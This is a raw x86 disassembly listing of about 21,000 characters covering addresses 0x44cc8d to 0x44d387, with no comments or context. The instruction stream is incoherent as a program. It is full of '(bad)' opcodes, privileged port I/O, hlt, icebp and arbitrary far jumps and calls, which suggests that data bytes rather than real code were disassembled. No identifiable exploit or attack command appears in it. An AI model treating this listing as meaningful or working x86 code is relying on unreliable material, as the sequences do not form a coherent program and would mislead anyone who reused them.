  44cc8d:	push   ebp
  44cc8e:	lods   al,BYTE PTR ds:[esi]
  44cc8f:	mov    bh,0x94
  44cc91:	mov    al,ds:0x7ae9e127
  44cc96:	stos   DWORD PTR es:[edi],eax
  44cc97:	fmul   st(1),st
  44cc99:	inc    ebx
  44cc9a:	pop    ds
  44cc9b:	popa   
  44cc9c:	pop    ebp
  44cc9d:	mov    al,0xeb
  44cc9f:	ja     0x44cc3d
  44cca1:	pop    edx
  44cca2:	out    dx,al
  44cca3:	jns    0x44cca7
  44cca5:	mov    dh,0x25
  44cca7:	mov    esp,0x94f3d7ba
  44ccac:	inc    esi
  44ccad:	jl     0x44cc6b
  44ccaf:	sub    BYTE PTR [edi-0x6f],bl
  44ccb2:	fwait
  44ccb3:	xchg   ebp,eax
  44ccb4:	jo     0x44cd0f
  44ccb6:	xchg   esi,eax
  44ccb7:	inc    esp
  44ccb8:	or     edi,DWORD PTR [esi+0x4825b7ee]
  44ccbe:	xor    eax,0x75eb7365
  44ccc3:	test   al,0x63
  44ccc5:	les    ecx,FWORD PTR [eax-0x579f3f54]
  44cccb:	pushf  
  44cccc:	pop    edi
  44cccd:	call   0xadc3:0x214cded
  44ccd4:	lahf   
  44ccd5:	or     esp,DWORD PTR [edx+0x7d]
  44ccd8:	xchg   ebp,eax
  44ccd9:	pop    edi
  44ccda:	cld    
  44ccdb:	ins    BYTE PTR es:[edi],dx
  44ccdc:	and    al,0xe6
  44ccde:	push   esi
  44ccdf:	xchg   edx,eax
  44cce0:	pop    edi
  44cce1:	test   eax,0x5b5d7c6d
  44cce6:	stc    
  44cce7:	loope  0x44cd1c
  44cce9:	shl    DWORD PTR [edx],0x9f
  44ccec:	adc    BYTE PTR [edi+0x33],0xa1
  44ccf0:	or     eax,0xc5917ba2
  44ccf5:	xlat   BYTE PTR ds:[ebx]
  44ccf6:	test   eax,0xc2e55e10
  44ccfb:	(bad)  
  44ccfc:	xchg   ecx,eax
  44ccfd:	js     0x44ccdf
  44ccff:	arpl   ax,si
  44cd01:	pop    esp
  44cd02:	cmp    ecx,ecx
  44cd04:	ja     0x44ccef
  44cd06:	fsub   DWORD PTR [eax]
  44cd08:	popf   
  44cd09:	sub    al,0xf8
  44cd0b:	shl    BYTE PTR [ebx-0x59],cl
  44cd0e:	xchg   esi,eax
  44cd0f:	ins    DWORD PTR es:[edi],dx
  44cd10:	mov    bl,0x6e
  44cd12:	out    dx,al
  44cd13:	cmc    
  44cd14:	jb     0x44cd32
  44cd16:	sbb    eax,ecx
  44cd18:	mov    DWORD PTR [esi],0x43a0a16b
  44cd1e:	jmp    0x5e3d:0x28087a7b
  44cd25:	pop    ebx
  44cd26:	fld    DWORD PTR [esi]
  44cd28:	cdq    
  44cd29:	icebp  
  44cd2a:	xor    eax,0xbc607d8f
  44cd2f:	retf   0x7176
  44cd32:	repnz in eax,dx
  44cd34:	rcr    BYTE PTR [ecx],cl
  44cd36:	out    dx,al
  44cd37:	pop    esi
  44cd38:	fiadd  WORD PTR [ecx]
  44cd3a:	sub    eax,0xc52c9fac
  44cd3f:	mov    al,ds:0x1326296a
  44cd44:	jnp    0x44cd88
  44cd46:	mov    esp,0xaeae5ea3
  44cd4b:	push   ebx
  44cd4c:	inc    edi
  44cd4d:	mov    DWORD PTR [ebp-0x32],esi
  44cd50:	jbe    0x44cdb2
  44cd52:	out    0x3d,al
  44cd54:	sub    DWORD PTR [edi+0x3f255744],0x995dcd9e
  44cd5e:	fidivr WORD PTR [edx+0x66]
  44cd61:	rol    ebx,1
  44cd63:	jb     0x44cdd7
  44cd65:	dec    ebp
  44cd66:	enter  0x9ba9,0x1b
  44cd6a:	out    0xab,eax
  44cd6c:	sti    
  44cd6d:	repz imul edx,DWORD PTR [edx+0x58fe21f1],0x5a
  44cd75:	xor    ch,dh
  44cd77:	mov    ds:0xec6aed54,eax
  44cd7c:	mov    dh,0xe4
  44cd7e:	pop    ds
  44cd7f:	mov    eax,ds:0xa08fb9dd
  44cd84:	inc    ebx
  44cd85:	imul   ebp,DWORD PTR [ebx],0xf2b95e62
  44cd8b:	out    dx,eax
  44cd8c:	cmp    BYTE PTR [edi+0x7d598dd9],ch
  44cd92:	jae    0x44cd7a
  44cd94:	ins    BYTE PTR es:[edi],dx
  44cd95:	pusha  
  44cd96:	out    0xd9,eax
  44cd98:	push   ebx
  44cd99:	jg     0x44cdd7
  44cd9b:	jl     0x44cdf8
  44cd9d:	jmp    0x629e:0x2de0f77a
  44cda4:	cld    
  44cda5:	retf   
  44cda6:	mov    cl,0x6c
  44cda8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cda9:	stos   BYTE PTR es:[edi],al
  44cdaa:	repnz repnz pop ss
  44cdad:	stos   DWORD PTR es:[edi],eax
  44cdae:	jmp    0x44cd49
  44cdb0:	mov    al,ds:0x5abaf6de
  44cdb5:	xor    eax,0xb18630b
  44cdba:	outs   dx,BYTE PTR ds:[esi]
  44cdbb:	je     0x44cd85
  44cdbd:	sbb    eax,0xb8f6c562
  44cdc2:	out    dx,al
  44cdc3:	call   0x44ad18da
  44cdc8:	xor    al,0xcf
  44cdca:	xor    eax,0x2208fe9f
  44cdcf:	cmc    
  44cdd0:	(bad)  
  44cdd1:	push   esi
  44cdd2:	repz sbb DWORD PTR [edi+ebx*2-0xd],esi
  44cdd7:	mov    al,0xe
  44cdd9:	mov    dh,0xe7
  44cddb:	pop    ds
  44cddc:	fsub   QWORD PTR [edx-0x13]
  44cddf:	aad    0x76
  44cde1:	push   ecx
  44cde2:	xchg   edi,eax
  44cde3:	out    0x1e,eax
  44cde5:	test   esp,ecx
  44cde7:	cmp    dl,BYTE PTR [ecx+0x7]
  44cdea:	fnstcw WORD PTR [eax]
  44cdec:	sub    DWORD PTR [ecx-0x3b],esp
  44cdef:	mov    dl,0xdb
  44cdf1:	push   ds
  44cdf2:	push   0x3e
  44cdf4:	clc    
  44cdf5:	pusha  
  44cdf6:	sar    BYTE PTR [ecx+eiz*1-0x5b],cl
  44cdfa:	daa    
  44cdfb:	loope  0x44ce11
  44cdfd:	dec    edi
  44cdfe:	es data16 sub al,0x61
  44ce02:	pop    eax
  44ce03:	imul   esi,DWORD PTR [edi],0x70b4e192
  44ce09:	inc    ebx
  44ce0a:	call   0x1fc1eadb
  44ce0f:	mov    cl,0x12
  44ce11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ce12:	adc    bh,BYTE PTR [ecx+0x5e]
  44ce15:	xor    DWORD PTR [esp+esi*8+0x58e8a278],0xf63760e8
  44ce20:	push   edx
  44ce21:	ja     0x44ce46
  44ce23:	stos   DWORD PTR es:[edi],eax
  44ce24:	mov    al,ds:0x539df07c
  44ce29:	(bad)
  44ce2c:	sahf   
  44ce2d:	push   eax
  44ce2e:	push   0x4a0665
  44ce33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44ce34:	pop    ebp
  44ce35:	push   ebx
  44ce36:	xchg   ebx,eax
  44ce37:	pop    edi
  44ce38:	ds pop ebp
  44ce3a:	loopne 0x44ce65
  44ce3c:	loopne 0x44ce5d
  44ce3e:	jmp    0xc3d8:0xc502a67b
  44ce45:	mov    al,ds:0x6bea8bc4
  44ce4a:	out    dx,al
  44ce4b:	stos   DWORD PTR es:[edi],eax
  44ce4c:	dec    eax
  44ce4d:	neg    DWORD PTR [esi]
  44ce4f:	data16 (bad) 
  44ce51:	pop    eax
  44ce52:	push   edi
  44ce53:	mov    ds:0x1fffb4c,al
  44ce58:	test   DWORD PTR [eax],ebp
  44ce5a:	popa   
  44ce5b:	pop    ecx
  44ce5c:	retf   
  44ce5d:	inc    esi
  44ce5e:	out    dx,al
  44ce5f:	xchg   edi,eax
  44ce60:	or     eax,0x14aa74d3
  44ce65:	pusha  
  44ce66:	sub    al,0xa2
  44ce68:	fbstp  TBYTE PTR [esp+ebp*8-0x3d58dfa]
  44ce6f:	shr    BYTE PTR [esi+0x10],0xee
  44ce73:	js     0x44ce30
  44ce75:	jp     0x44cef5
  44ce77:	retf   0x74e4
  44ce7a:	add    ah,BYTE PTR [ecx-0x28049ddb]
  44ce80:	or     DWORD PTR [ebx+0x3942454d],edi
  44ce86:	dec    ecx
  44ce87:	jg     0x44cee7
  44ce89:	dec    edx
  44ce8a:	push   edi
  44ce8b:	add    ch,0x79
  44ce8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ce8f:	mov    eax,ds:0x5dac830e
  44ce94:	pop    ds
  44ce95:	(bad)  
  44ce96:	push   ecx
  44ce97:	xchg   ecx,eax
  44ce98:	pop    esi
  44ce99:	retf   
  44ce9a:	fcmovu st,st(5)
  44ce9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ce9d:	rcr    bl,0x26
  44cea0:	push   esp
  44cea1:	popa   
  44cea2:	loope  0x44ce5c
  44cea4:	inc    edx
  44cea5:	push   ss
  44cea6:	imul   BYTE PTR [eax-0x2e]
  44cea9:	lahf   
  44ceaa:	out    dx,al
  44ceab:	loop   0x44cf22
  44cead:	pop    esi
  44ceae:	pop    ebx
  44ceaf:	inc    esi
  44ceb0:	sahf   
  44ceb1:	jae    0x44cf1e
  44ceb3:	mov    eax,ds:0x6fcaa57d
  44ceb8:	not    DWORD PTR [eax]
  44ceba:	jmp    0x5e45:0x2fa74c96
  44cec1:	mov    eax,ds:0xf6538a3d
  44cec6:	(bad)  
  44cec7:	mov    al,ds:0xcb94daa8
  44cecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cecd:	xchg   ebx,eax
  44cece:	into   
  44cecf:	stos   DWORD PTR es:[edi],eax
  44ced0:	push   edx
  44ced1:	outs   dx,DWORD PTR ds:[esi]
  44ced2:	mov    ebp,DWORD PTR [esi-0x7d77e75d]
  44ced8:	lahf   
  44ced9:	dec    ebx
  44ceda:	fld    DWORD PTR [edx-0x66]
  44cedd:	clc    
  44cede:	dec    ebx
  44cedf:	pushf  
  44cee0:	(bad)  [esi]
  44cee2:	push   ss
  44cee3:	or     eax,0xa2a7c35e
  44cee8:	fs mov cl,0x21
  44ceeb:	xchg   ebx,eax
  44ceec:	or     eax,0xcdb7b8e1
  44cef1:	ja     0x44cef8
  44cef3:	sbb    ecx,DWORD PTR [eax+eiz*2-0x1a1a6507]
  44cefa:	lahf   
  44cefb:	add    esi,ecx
  44cefd:	mov    ah,0xee
  44ceff:	cmp    DWORD PTR [ecx+edx*1],0xffffffd0
  44cf03:	fadd   DWORD PTR [edi+0x29]
  44cf06:	mov    eax,ss:0x439c6b10
  44cf0c:	adc    al,0x3c
  44cf0e:	push   cs
  44cf0f:	je     0x44cf6f
  44cf11:	jge    0x44cef5
  44cf13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cf14:	(bad)  
  44cf15:	imul   esi,DWORD PTR [edx+ecx*4],0xffffffb7
  44cf19:	pop    edi
  44cf1a:	ds (bad) 
  44cf1d:	push   edx
  44cf1e:	pop    edx
  44cf1f:	sar    DWORD PTR [ebx],cl
  44cf21:	lds    ecx,FWORD PTR [esi+0x56]
  44cf24:	mov    ds:0xfc019698,eax
  44cf29:	jno    0x44cf52
  44cf2b:	rcl    BYTE PTR [esi+ebx*2+0x61],cl
  44cf2f:	adc    ebx,DWORD PTR [ebp+esi*4+0x2e]
  44cf33:	cmp    ch,BYTE PTR [esi+0x20]
  44cf36:	fiadd  DWORD PTR [ebx+0x2c997c5e]
  44cf3c:	sbb    al,0xf9
  44cf3e:	cld    
  44cf3f:	mov    ecx,0xaff960df
  44cf44:	sub    al,0xd2
  44cf46:	pop    eax
  44cf47:	dec    esi
  44cf48:	pop    esp
  44cf49:	fucomp st(6)
  44cf4b:	jnp    0x44cef5
  44cf4d:	push   es
  44cf4e:	cmp    BYTE PTR [esi+ecx*8+0x37a36441],cl
  44cf55:	and    al,0x6
  44cf57:	mul    BYTE PTR [eax+ebp*4-0x32]
  44cf5b:	push   ds
  44cf5c:	dec    ebp
  44cf5d:	xchg   esi,ebp
  44cf5f:	xchg   BYTE PTR [ebx],ah
  44cf61:	and    DWORD PTR [ebx+0x68],esi
  44cf64:	pop    ecx
  44cf65:	dec    edi
  44cf66:	sbb    al,0x9f
  44cf68:	pop    es
  44cf69:	jb     0x44ceee
  44cf6b:	sbb    DWORD PTR [esi],0xb90d5076
  44cf71:	pop    ss
  44cf72:	(bad)  
  44cf73:	iret   
  44cf74:	ss inc ebx
  44cf76:	fsub   QWORD PTR [eax]
  44cf78:	cwde   
  44cf79:	push   ebp
  44cf7a:	adc    ecx,esp
  44cf7c:	adc    DWORD PTR [ecx-0x76],ebx
  44cf7f:	jl     0x44cf16
  44cf81:	int3   
  44cf82:	inc    edx
  44cf83:	lahf   
  44cf84:	test   al,0xd0
  44cf86:	mov    WORD PTR [ecx+0xc9d02e9],fs
  44cf8c:	sbb    edx,DWORD PTR [ebp+0x6a]
  44cf8f:	into   
  44cf90:	pop    esi
  44cf91:	(bad)  
  44cf92:	ins    BYTE PTR es:[edi],dx
  44cf93:	stos   BYTE PTR es:[edi],al
  44cf94:	add    BYTE PTR ds:0x60bd3770,al
  44cf9a:	call   0xa5a30a93
  44cf9f:	cdq    
  44cfa0:	push   0x14
  44cfa2:	into   
  44cfa3:	jecxz  0x44cf3d
  44cfa5:	adc    dh,dl
  44cfa7:	inc    esi
  44cfa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cfa9:	pusha  
  44cfaa:	imul   ebp,edi,0x4e
  44cfad:	fcomp  QWORD PTR [edi-0x52]
  44cfb0:	cmp    eax,0xea1ed26
  44cfb5:	or     bh,BYTE PTR [ebp+0x564186d3]
  44cfbb:	(bad)  
  44cfbc:	es push 0xd8d0c503
  44cfc2:	shl    BYTE PTR [eax-0x6b150874],1
  44cfc8:	xchg   DWORD PTR [ebx+0x677887b6],ebx
  44cfce:	shl    DWORD PTR [edi],1
  44cfd0:	in     al,dx
  44cfd1:	adc    BYTE PTR ds:[esi+edi*1],dh
  44cfd5:	mov    ebp,0x615867fd
  44cfda:	jmp    0xad36:0x6bd862e5
  44cfe1:	out    dx,al
  44cfe2:	add    dl,BYTE PTR [ecx+0x4e]
  44cfe5:	rep outs dx,BYTE PTR ds:[esi]
  44cfe7:	ja     0x44d005
  44cfe9:	mov    edi,0x60cfc673
  44cfee:	dec    edi
  44cfef:	sbb    ah,BYTE PTR [edx+ebx*2]
  44cff2:	scas   al,BYTE PTR es:[edi]
  44cff3:	pushf  
  44cff4:	sub    DWORD PTR [edi+0x2e78bf2d],ecx
  44cffa:	lds    edi,FWORD PTR [esi-0x60e13402]
  44d000:	push   edx
  44d001:	adc    eax,DWORD PTR [esp+edi*2-0x3]
  44d005:	dec    edi
  44d006:	retf   
  44d007:	nop
  44d008:	aas    
  44d009:	mov    DWORD PTR [ecx-0x1e68135d],esp
  44d00f:	rcr    BYTE PTR [edi+0x52],cl
  44d012:	mov    ecx,0xaf8ed994
  44d017:	dec    eax
  44d018:	les    ecx,FWORD PTR [edx+0x536c9032]
  44d01e:	pop    esp
  44d01f:	mov    ds:0x1af5329b,al
  44d024:	outs   dx,DWORD PTR ds:[esi]
  44d025:	mov    esp,0x2d5e95a6
  44d02a:	stos   BYTE PTR es:[edi],al
  44d02b:	shl    bl,cl
  44d02d:	xlat   BYTE PTR ds:[ebx]
  44d02e:	xchg   ebp,eax
  44d02f:	cmp    DWORD PTR gs:[edx],esp
  44d032:	pop    es
  44d033:	push   0xa0d47e5c
  44d038:	xchg   DWORD PTR [edx+0x73],edx
  44d03b:	fisub  WORD PTR [ecx+esi*8+0x38]
  44d03f:	into   
  44d040:	sbb    eax,0x76072241
  44d045:	push   0x961e93bd
  44d04a:	sbb    al,0xa1
  44d04c:	cmc    
  44d04d:	jp     0x44d013
  44d04f:	clc    
  44d050:	(bad)  
  44d051:	xor    al,0xf7
  44d053:	sti    
  44d054:	add    edx,DWORD PTR [edi+edi*8]
  44d057:	mov    dl,0x5e
  44d059:	pop    edi
  44d05a:	int3   
  44d05b:	aam    0xa6
  44d05d:	in     eax,0x53
  44d05f:	mov    eax,ds:0xb681fec2
  44d064:	shl    BYTE PTR ds:0x1c5e257a,cl
  44d06a:	(bad)  
  44d06b:	fadd   DWORD PTR [ebx]
  44d06d:	in     al,dx
  44d06e:	pop    ebx
  44d06f:	popa   
  44d070:	dec    eax
  44d071:	popa   
  44d072:	push   ds
  44d073:	mov    esp,0x5175336d
  44d078:	xchg   BYTE PTR [edi-0x12],dh
  44d07b:	xchg   edx,eax
  44d07c:	pop    edx
  44d07d:	inc    ebp
  44d07e:	and    ebx,esi
  44d080:	(bad)  
  44d082:	enter  0x5008,0x5c
  44d086:	pop    ebx
  44d087:	inc    eax
  44d088:	sub    al,0xfb
  44d08a:	shl    DWORD PTR [eax],cl
  44d08c:	adc    al,0x2d
  44d08e:	shl    DWORD PTR [edx],1
  44d090:	arpl   WORD PTR [edi-0x73],ax
  44d093:	rcl    DWORD PTR [edx-0x7f],0xa9
  44d097:	and    dh,BYTE PTR [ebp+0x4ea42220]
  44d09d:	sbb    edx,edi
  44d09f:	mov    eax,ds:0x898624e1
  44d0a4:	fistp  WORD PTR [ecx-0x6e793812]
  44d0aa:	sub    eax,0x254085c9
  44d0af:	mov    eax,ds:0x1dbdc77d
  44d0b4:	in     al,dx
  44d0b5:	adc    cl,dl
  44d0b7:	pop    ds
  44d0b8:	hlt    
  44d0b9:	into   
  44d0ba:	add    ch,BYTE PTR [ebx+0x1aee4277]
  44d0c0:	pop    ebx
  44d0c1:	stc    
  44d0c2:	mov    ?,WORD PTR [edi+0x5a]
  44d0c5:	leave  
  44d0c6:	fldenv [edx+0x42c5b0e6]
  44d0cc:	push   ecx
  44d0cd:	jns    0x44d0fd
  44d0cf:	lods   al,BYTE PTR ds:[esi]
  44d0d0:	lock or eax,0x3c2632ee
  44d0d6:	sub    ah,BYTE PTR [esi]
  44d0d8:	or     al,0xf
  44d0da:	icebp  
  44d0db:	mov    ds:0xc2f326a1,eax
  44d0e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d0e1:	stc    
  44d0e2:	dec    ebx
  44d0e3:	popf   
  44d0e4:	jbe    0x44d161
  44d0e6:	sbb    edx,esp
  44d0e8:	pop    esi
  44d0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d0ea:	adc    BYTE PTR [eax+0x3d],al
  44d0ed:	xchg   edx,eax
  44d0ee:	sbb    bl,bl
  44d0f0:	jns    0x44d122
  44d0f2:	jecxz  0x44d094
  44d0f4:	mov    al,0xd3
  44d0f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d0f7:	and    DWORD PTR [ebp+0x5e2d9373],ecx
  44d0fd:	(bad)  
  44d0fe:	hlt    
  44d0ff:	(bad)  
  44d100:	sub    bl,al
  44d102:	test   DWORD PTR [esi-0x6c],0x11d9855f
  44d109:	mov    esi,0x72e6f0ad
  44d10e:	out    dx,al
  44d10f:	sbb    edi,DWORD PTR [eax]
  44d111:	inc    eax
  44d112:	fisub  DWORD PTR [ebx-0x3f2fa5fd]
  44d118:	stc    
  44d119:	outs   dx,DWORD PTR cs:[esi]
  44d11b:	(bad)  
  44d11c:	repnz pop ecx
  44d11e:	jns    0x44d17f
  44d120:	ja     0x44d122
  44d122:	je     0x44d11a
  44d124:	jae    0x44d10f
  44d126:	jmp    0xd6522ee9
  44d12b:	add    eax,0xf7227a9e
  44d130:	jmp    DWORD PTR [eax-0x21]
  44d133:	add    al,0x81
  44d135:	sar    edx,cl
  44d137:	(bad)
  44d13a:	out    dx,al
  44d13b:	test   DWORD PTR [edx],eax
  44d13d:	scas   al,BYTE PTR es:[edi]
  44d13e:	xor    edi,edi
  44d140:	scas   eax,DWORD PTR es:[edi]
  44d141:	sub    al,0x54
  44d143:	mov    eax,ds:0xf6bf5200
  44d148:	std    
  44d149:	push   0x60
  44d14b:	cli    
  44d14c:	pop    esi
  44d14d:	test   dl,cl
  44d14f:	jno    0x44d160
  44d151:	sbb    eax,0x522067b2
  44d156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44d157:	mov    ch,0xfc
  44d159:	fmulp  st(6),st
  44d15b:	mov    esp,0xc0d2402b
  44d160:	pop    edi
  44d161:	daa    
  44d162:	sbb    ebx,eax
  44d164:	shl    BYTE PTR [esi-0x4],cl
  44d167:	inc    eax
  44d168:	and    al,0x7a
  44d16a:	retf   
  44d16b:	mov    eax,0xaba0c5cb
  44d170:	jmp    0x2fd23fa2
  44d175:	outs   dx,DWORD PTR ds:[esi]
  44d176:	add    esi,ebx
  44d178:	mov    dl,0x27
  44d17a:	clc    
  44d17b:	lods   eax,DWORD PTR ds:[esi]
  44d17c:	std    
  44d17d:	cmp    esi,ebp
  44d17f:	lods   eax,DWORD PTR ds:[esi]
  44d180:	add    ebp,DWORD PTR [ecx]
  44d182:	lods   eax,DWORD PTR ds:[esi]
  44d183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44d184:	jmp    0x44d1c9
  44d186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d187:	and    BYTE PTR ds:0xd706daa1,ch
  44d18d:	dec    esp
  44d18e:	shr    DWORD PTR [eax-0x2e765a1],cl
  44d194:	xor    ebx,DWORD PTR [ecx+ebp*4+0x7b]
  44d198:	add    eax,0xbac6beb1
  44d19d:	push   ebp
  44d19e:	mov    dl,0x80
  44d1a0:	pop    ds
  44d1a1:	mov    DWORD PTR [esi-0x2f9b02c5],ecx
  44d1a7:	add    al,0xf7
  44d1a9:	and    ch,dh
  44d1ab:	(bad)  
  44d1ad:	xor    BYTE PTR [ebp-0x37],bl
  44d1b0:	push   esi
  44d1b1:	sbb    ah,BYTE PTR [eax-0x17]
  44d1b4:	jmp    0x6c34:0x9a41b152
  44d1bb:	(bad)  
  44d1bc:	fbld   TBYTE PTR [edx+edi*4]
  44d1bf:	and    al,0xdc
  44d1c1:	mov    ds:0x60f44104,eax
  44d1c6:	jo     0x44d1cc
  44d1c8:	lds    ebp,FWORD PTR [ecx-0x7c]
  44d1cb:	xchg   esi,eax
  44d1cc:	in     al,dx
  44d1cd:	int    0xd9
  44d1cf:	mov    dl,0x53
  44d1d1:	pop    eax
  44d1d2:	ins    BYTE PTR es:[edi],dx
  44d1d3:	lds    ebx,FWORD PTR [esi]
  44d1d5:	pop    ss
  44d1d6:	xchg   ebx,eax
  44d1d7:	inc    esp
  44d1d8:	js     0x44d21e
  44d1da:	in     eax,dx
  44d1db:	lahf   
  44d1dc:	cld    
  44d1dd:	xor    esp,DWORD PTR ds:0x531c9e54
  44d1e3:	shl    ebp,1
  44d1e5:	fs out dx,al
  44d1e7:	xchg   edx,eax
  44d1e8:	es enter 0xeb1e,0x2a
  44d1ed:	sbb    BYTE PTR [edx-0x76a06310],al
  44d1f3:	mov    bl,ch
  44d1f5:	fucomi st,st(5)
  44d1f7:	test   DWORD PTR [edx],0xd61bcea1
  44d1fd:	outs   dx,DWORD PTR ds:[esi]
  44d1fe:	dec    ebx
  44d1ff:	push   edx
  44d200:	repnz nop
  44d202:	push   ss
  44d203:	ins    DWORD PTR es:[edi],dx
  44d204:	pop    esi
  44d205:	out    dx,eax
  44d206:	outs   dx,BYTE PTR ds:[esi]
  44d207:	mov    ah,0x97
  44d209:	cld    
  44d20a:	fwait
  44d20b:	mov    ds:0xa40bc186,eax
  44d210:	out    dx,eax
  44d211:	stos   BYTE PTR es:[edi],al
  44d212:	dec    ebx
  44d213:	pop    edx
  44d214:	test   al,0x3c
  44d216:	jbe    0x44d1b2
  44d218:	rol    DWORD PTR [edx+0x2e],cl
  44d21b:	aad    0x17
  44d21d:	pop    eax
  44d21e:	push   ds
  44d21f:	les    ebp,FWORD PTR [eax+eiz*1]
  44d222:	sahf   
  44d223:	xchg   ecx,eax
  44d224:	jne    0x44d25c
  44d226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44d227:	sub    DWORD PTR [eax-0x5f],edx
  44d22a:	dec    esi
  44d22b:	js     0x44d216
  44d22d:	popa   
  44d22e:	xchg   esp,eax
  44d22f:	mov    al,0x87
  44d231:	mov    WORD PTR ds:0x337651de,ds
  44d237:	je     0x44d279
  44d239:	jae    0x44d1e7
  44d23b:	lahf   
  44d23c:	xchg   DWORD PTR [eax-0x6e],edi
  44d23f:	push   edx
  44d240:	sub    al,0x5a
  44d242:	(bad)  
  44d243:	xchg   ebx,eax
  44d244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d245:	rol    BYTE PTR [edx],1
  44d247:	adc    ah,BYTE PTR [esi]
  44d249:	mov    al,ds:0x2466811f
  44d24e:	(bad)  
  44d24f:	mov    esp,0xede86441
  44d254:	icebp  
  44d255:	push   edx
  44d256:	hlt    
  44d257:	and    BYTE PTR [edx+0x5b],dh
  44d25a:	mov    fs,WORD PTR [edi-0x8205721]
  44d260:	xchg   edx,eax
  44d261:	aam    0xae
  44d263:	adc    eax,0xa29b9be7
  44d268:	or     al,0xb7
  44d26a:	push   edi
  44d26b:	mov    eax,ds:0x455bb147
  44d270:	adc    al,0xb6
  44d272:	jo     0x44d217
  44d274:	pop    ebp
  44d275:	(bad)  
  44d276:	fldenv [ebp-0x6d57b518]
  44d27c:	xchg   ecx,eax
  44d27d:	popf   
  44d27e:	push   0x7b
  44d280:	sbb    eax,0xaa3d50b9
  44d285:	xor    ch,BYTE PTR [eax+0x7d]
  44d288:	jnp    0x44d2db
  44d28a:	fcom   QWORD PTR [ebp+0xb139d70]
  44d290:	cs fdiv st,st(6)
  44d293:	mov    ebp,?
  44d295:	sahf   
  44d296:	retf   0xd59c
  44d299:	mov    WORD PTR [edx-0x8b2a9a3],ss
  44d29f:	nop
  44d2a0:	push   esi
  44d2a1:	push   edi
  44d2a2:	sub    BYTE PTR [ecx-0x23f96629],bl
  44d2a8:	jbe    0x44d287
  44d2aa:	inc    edx
  44d2ab:	ins    DWORD PTR es:[edi],dx
  44d2ac:	mov    edx,0x86ccae7e
  44d2b1:	sbb    bl,BYTE PTR [edx-0x66]
  44d2b4:	arpl   cx,bp
  44d2b6:	pop    ebp
  44d2b7:	ss daa 
  44d2b9:	loopne 0x44d32c
  44d2bb:	sbb    esp,edx
  44d2bd:	dec    esi
  44d2be:	cs xchg ecx,eax
  44d2c0:	in     eax,0x5d
  44d2c2:	lods   eax,DWORD PTR ds:[esi]
  44d2c3:	mov    eax,ds:0xa50a0ce7
  44d2c8:	mov    esi,0x5e66f20e
  44d2cd:	pop    edi
  44d2ce:	push   ebp
  44d2cf:	and    al,0xa0
  44d2d1:	pop    ebx
  44d2d2:	adc    ebx,DWORD PTR [ebx-0x1b]
  44d2d5:	js     0x44d28b
  44d2d7:	ins    BYTE PTR es:[edi],dx
  44d2d8:	mov    cs,WORD PTR [esi+0x2b]
  44d2db:	sub    esi,esi
  44d2dd:	pop    edi
  44d2de:	aas    
  44d2df:	xchg   ebx,eax
  44d2e0:	cli    
  44d2e1:	shr    ecx,1
  44d2e3:	sub    ch,ch
  44d2e5:	pusha  
  44d2e6:	imul   esp,DWORD PTR [ebp+0x5a],0xc
  44d2ea:	mov    ebx,0xfbc90bd1
  44d2ef:	stos   BYTE PTR es:[edi],al
  44d2f0:	loope  0x44d2ba
  44d2f2:	inc    edi
  44d2f3:	or     bh,ah
  44d2f5:	cdq    
  44d2f6:	push   es
  44d2f7:	aas    
  44d2f8:	fnstsw WORD PTR [eax-0xef91f2c]
  44d2fe:	clc    
  44d2ff:	test   al,0x73
  44d301:	sub    eax,0xad9f75ea
  44d306:	mov    bl,0x51
  44d308:	pop    edi
  44d309:	xchg   edi,eax
  44d30a:	cmp    DWORD PTR [edx+0x74c4906e],esp
  44d310:	jbe    0x44d332
  44d312:	mov    esi,0x1d6cb3
  44d317:	rcr    DWORD PTR [edi-0x61],0x2a
  44d31b:	cdq    
  44d31c:	in     eax,0x15
  44d31e:	dec    esi
  44d31f:	ins    BYTE PTR es:[edi],dx
  44d320:	push   edx
  44d321:	std    
  44d322:	hlt    
  44d323:	pop    esp
  44d324:	fs scas eax,DWORD PTR es:[edi]
  44d326:	mov    dl,0x9c
  44d328:	fst    st(3)
  44d32a:	xchg   bl,al
  44d32c:	push   cs
  44d32d:	int    0x5f
  44d32f:	push   edx
  44d330:	xor    al,0x7
  44d332:	(bad)  
  44d333:	jmp    0xc46e:0xcac25902
  44d33a:	and    dh,al
  44d33c:	out    0x63,al
  44d33e:	push   esi
  44d33f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44d340:	in     eax,0xa
  44d342:	mul    ch
  44d344:	(bad)  
  44d345:	adc    al,BYTE PTR [eax]
  44d347:	xchg   ebp,eax
  44d348:	jae    0x44d2d3
  44d34a:	aaa    
  44d34b:	es push edi
  44d34d:	cld    
  44d34e:	cmp    eax,0x83162caf
  44d353:	retf   
  44d354:	xchg   DWORD PTR ds:0xa0de550e,esi
  44d35a:	xor    al,bl
  44d35c:	jae    0x44d3ad
  44d35e:	jae    0x44d3c7
  44d360:	pop    edi
  44d361:	pop    es
  44d362:	ror    bh,0x15
  44d365:	push   es
  44d366:	rcl    DWORD PTR [ebx+0x7e],0xdb
  44d36a:	shl    DWORD PTR [ecx-0x58c4ff8a],cl
  44d370:	sahf   
  44d371:	aad    0x38
  44d373:	jmp    0x44d3c0
  44d375:	ja     0x44d3a5
  44d377:	pushf  
  44d378:	bound  eax,QWORD PTR [ebp-0x32]
  44d37b:	test   al,0x1
  44d37d:	jmp    0xb7307539
  44d382:	add    BYTE PTR [eax],al
  44d384:	daa    
  44d385:	add    al,0x0
  44d387:	adc    BYTE PTR ds:0x0,al
